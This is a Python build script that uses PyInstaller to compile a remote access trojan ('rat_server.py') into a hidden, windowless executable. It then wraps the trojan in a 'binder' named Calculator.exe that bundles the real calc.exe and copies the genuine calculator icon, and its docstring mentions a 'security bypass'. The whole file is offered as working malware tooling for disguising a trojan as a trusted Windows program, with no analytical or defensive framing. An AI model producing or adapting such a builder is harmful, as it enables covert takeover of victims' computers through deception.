import ctypes
import subprocess
from ctypes import wintypes
import os
import shutil
import requests
from PIL import Image
from PyInstaller.__main__ import run

# Configuration
VC_REDIST_URL = "https://aka.ms/vs/17/release/vc_redist.x64.exe"
SYSTEM32_PATH = os.path.join(os.environ["SystemRoot"], "System32")
DLL_CACHE = "./dll_cache"
REQUIRED_DLLS = {
    "msvcp140.dll": VC_REDIST_URL,
    "vcruntime140.dll": VC_REDIST_URL
}


# Windows API Structures
class ICONINFO(ctypes.Structure):
    _fields_ = [
        ("fIcon", wintypes.BOOL),
        ("xHotspot", wintypes.DWORD),
        ("yHotspot", wintypes.DWORD),
        ("hbmMask", wintypes.HANDLE),
        ("hbmColor", wintypes.HANDLE)
    ]


class BITMAP(ctypes.Structure):
    _fields_ = [
        ("bmType", wintypes.LONG),
        ("bmWidth", wintypes.LONG),
        ("bmHeight", wintypes.LONG),
        ("bmWidthBytes", wintypes.LONG),
        ("bmPlanes", wintypes.WORD),
        ("bmBitsPixel", wintypes.WORD),
        ("bmBits", wintypes.LPVOID)
    ]

class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ("biSize", ctypes.c_ulong),  # DWORD -> c_ulong
        ("biWidth", ctypes.c_long),  # LONG -> c_long
        ("biHeight", ctypes.c_long),
        ("biPlanes", ctypes.c_ushort),
        ("biBitCount", ctypes.c_ushort),
        ("biCompression", ctypes.c_ulong),
        ("biSizeImage", ctypes.c_ulong),
        ("biXPelsPerMeter", ctypes.c_long),
        ("biYPelsPerMeter", ctypes.c_long),
        ("biClrUsed", ctypes.c_ulong),
        ("biClrImportant", ctypes.c_ulong),
    ]


def extract_calculator_icon():
    """Extract first icon from calculator.exe using Windows API"""
    try:
        # Load Windows DLLs
        shell32 = ctypes.WinDLL("shell32", use_last_error=True)
        user32 = ctypes.WinDLL("user32", use_last_error=True)
        gdi32 = ctypes.WinDLL("gdi32", use_last_error=True)

        # Get calculator path
        calc_path = os.path.join(SYSTEM32_PATH, "calc.exe")

        # Extract first icon
        hicon = shell32.ExtractIconW(0, calc_path, 0)
        if not hicon:
            raise ctypes.WinError(ctypes.get_last_error())

        # Get icon information
        ico_info = ICONINFO()
        if not user32.GetIconInfo(hicon, ctypes.byref(ico_info)):
            raise ctypes.WinError(ctypes.get_last_error())

        # Get bitmap information
        bmp = BITMAP()
        gdi32.GetObjectW.argtypes = [wintypes.HGDIOBJ, ctypes.c_int, ctypes.c_void_p]
        gdi32.GetObjectW(ico_info.hbmColor, ctypes.sizeof(BITMAP), ctypes.byref(bmp))

        # Create BITMAPINFO structure
        bi = ctypes.create_string_buffer(40)
        ctypes.memset(bi, 0, 40)
        bih = ctypes.cast(bi, ctypes.POINTER(BITMAPINFOHEADER))  # Updated here
        bih.contents.biSize = 40
        bih.contents.biWidth = bmp.bmWidth
        bih.contents.biHeight = -bmp.bmHeight  # Top-down DIB
        bih.contents.biPlanes = 1
        bih.contents.biBitCount = 32
        bih.contents.biCompression = 0  # BI_RGB

        # Create buffer for bitmap data
        buffer_size = bmp.bmWidthBytes * bmp.bmHeight
        buffer = ctypes.create_string_buffer(buffer_size)

        # Get DIBits
        hdc = user32.GetDC(None)
        if not gdi32.GetDIBits(hdc, ico_info.hbmColor, 0, bmp.bmHeight,
                               buffer, ctypes.byref(bih), 0):
            raise ctypes.WinError(ctypes.get_last_error())

        # Convert to Pillow Image
        img = Image.frombuffer(
            "RGBA",
            (bmp.bmWidth, bmp.bmHeight),
            buffer.raw,
            "raw",
            "BGRA",
            0, 1
        )

        # Save as ICO
        img.save("calculator.ico", format="ICO", sizes=[(bmp.bmWidth, bmp.bmHeight)])
        print("Successfully extracted calculator icon")

        # Cleanup resources
        user32.DestroyIcon(hicon)
        user32.ReleaseDC(None, hdc)
        gdi32.DeleteObject(ico_info.hbmColor)
        gdi32.DeleteObject(ico_info.hbmMask)

    except Exception as e:
        print(f"Icon extraction failed: {str(e)}")

        # Fallback handling
        fallback_icon = 'calc.ico'
        if os.path.exists(fallback_icon):
            shutil.copy(fallback_icon, 'calculator.ico')
            print("Using fallback calc.ico")
        else:
            print("Fallback icon not found. Proceeding without icon.")


def ensure_dependencies():
    """Check and acquire required system dependencies"""
    os.makedirs(DLL_CACHE, exist_ok=True)

    for dll, src in REQUIRED_DLLS.items():
        system_path = os.path.join(SYSTEM32_PATH, dll)
        cache_path = os.path.join(DLL_CACHE, dll)

        if not os.path.exists(system_path) and not os.path.exists(cache_path):
            print(f"Downloading {dll} dependencies...")
            try:
                r = requests.get(src)
                installer_path = os.path.join(DLL_CACHE, "vc_redist.exe")
                with open(installer_path, 'wb') as f:
                    f.write(r.content)

                subprocess.run([installer_path, '/quiet', '/norestart'], check=True)
                print("Installed Visual C++ Redistributable")

            except Exception as e:
                print(f"Dependency installation failed: {str(e)}")
                raise


def build_rat():
    """Compile RAT server with dependency handling"""
    ensure_dependencies()

    pyinstaller_args = [
        'rat_server.py',
        '--onefile',
        '--noconsole',
        '--name=rat_server.exe',
        '--distpath=./dist',
        '--hidden-import=ctypes'
    ]

    for dll in REQUIRED_DLLS:
        dll_path = os.path.join(SYSTEM32_PATH, dll)
        if not os.path.exists(dll_path):
            dll_path = os.path.join(DLL_CACHE, dll)
        pyinstaller_args.extend(['--add-binary', f'{dll_path};.'])

    run(pyinstaller_args)


def build_binder():
    """Compile binder with security bypass"""
    ensure_dependencies()
    extract_calculator_icon()
    system32 = os.path.join(os.environ["SystemRoot"], "System32")

    run([
        'binder.py',
        '--onefile',
        '--noconsole',
        '--name=Calculator.exe',
        '--icon=calculator.ico',
        '--add-data=dist/rat_server.exe;.',
        f'--add-data={system32}/calc.exe;.',
        '--hidden-import=win32api,win32event',
        f'--add-binary={system32}/msvcp140.dll;.',
        f'--add-binary={system32}/vcruntime140.dll;.',
        '--runtime-tmpdir=.',  # Custom temp handling
        '--clean'
    ])

    args = [
        'binder.py',
        '--onefile',
        '--noconsole',
        '--name=Calculator.exe',
        '--icon=calculator.ico',
        '--add-data=dist/rat_server.exe;.',
        '--add-data=' + os.path.join(system32, 'calc.exe') + ';.',
        '--clean'
    ]

    # Add DLLs only if they exist
    for dll in ['msvcp140.dll', 'vcruntime140.dll']:
        dll_path = os.path.join(system32, dll)
        if os.path.exists(dll_path):
            args.append('--add-binary=' + dll_path + ';.')
        else:
            print(f"Warning: {dll} not found in System32")

    run(args)


if __name__ == "__main__":
    try:
        build_rat()
        build_binder()
    finally:
        shutil.rmtree('build', ignore_errors=True)
        if os.path.exists("calculator.ico"):
            os.remove("calculator.ico")